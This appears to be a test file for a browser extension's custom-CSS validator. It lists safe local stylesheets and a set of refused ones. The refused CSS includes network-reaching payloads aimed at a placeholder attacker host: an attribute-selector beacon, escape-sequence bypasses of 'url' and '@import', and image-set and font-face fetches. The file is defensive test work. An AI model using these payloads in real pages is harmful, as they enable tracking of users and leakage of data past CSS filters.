// SPDX-License-Identifier: AGPL-3.0-or-later

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { THEME_IDS, checkCustomCss, normalizeAppearance, MAX_CUSTOM_CSS } from '../extension/src/core/theme.js';

test('themes', () => {
  assert.deepEqual(THEME_IDS, ['auto', 'sumi', 'washi', 'aero', 'aero-night']);
  assert.deepEqual(normalizeAppearance({}), { theme: 'auto', customCss: '' });
  assert.deepEqual(normalizeAppearance({ theme: 'aero', customCss: 'a { color: red }' }), { theme: 'aero', customCss: 'a { color: red }' });
  assert.equal(normalizeAppearance({ theme: 'myspace' }).theme, 'auto');
  assert.equal(normalizeAppearance({ customCss: 'a{background:url(https://x)}' }).customCss, '', 'stored unsafe CSS is dropped');
});

test('custom CSS: anything that stays local is fine', () => {
  for (const ok of [
    ':root { --paper: #f3effa; --shu: #7b5cd6; }',
    '.card { border-radius: 0; box-shadow: none; }',
    'body { background: linear-gradient(#000, #123) fixed; }',
    '.brand::after { content: "a remembered thing"; }',
    '.x { background: url(data:image/png;base64,iVBORw0KGgo=); }',
    '.x { background: url( "data:image/svg+xml;utf8,<svg/>" ); }',
    '@media (prefers-color-scheme: dark) { :root { --ink: #fff } }',
    '@font-face { font-family: Mine; src: local("Comic Sans MS"); }',
    '',
  ]) assert.equal(checkCustomCss(ok), null, ok);
});

test('custom CSS: every way of reaching the network is refused', () => {
  for (const bad of [
    'a[href*="dQw4w9WgXcQ"] { background: url(https://evil.example/seen) }',
    'a { background: URL("//evil.example/x") }',
    'a { background: url(   http://evil.example ) }',
    'a { background: u\\72 l(https://evil.example) }', // CSS escape for "r"
    'a { background: \\75\\72\\6c(https://evil.example) }', // fully escaped "url"
    'a { background: ur\\l(https://evil.example) }',
    '@import "https://evil.example/theme.css";',
    '@\\69mport url(x.css);',
    '/* hi */ @import url(x.css);',
    'a { background: image-set("https://evil.example/a.png" 1x) }',
    'a { background: -webkit-image-set(url(https://evil.example/a.png) 1x) }',
    'a { background: image("https://evil.example/a.png") }',
    'a { background: cross-fade(url(a.png), url(b.png)) }',
    '@font-face { font-family: X; src: url(https://evil.example/f.woff2) }',
    'a { background: attr(href url) }',
    '@namespace svg url(http://www.w3.org/2000/svg);',
    'a { cursor: url(cursor.png), auto }', // relative URLs resolve to the extension, still not allowed
  ]) assert.ok(checkCustomCss(bad), bad);
  assert.match(checkCustomCss('x'.repeat(MAX_CUSTOM_CSS + 1)), /limited/);
  assert.match(checkCustomCss(42), /text/);
});
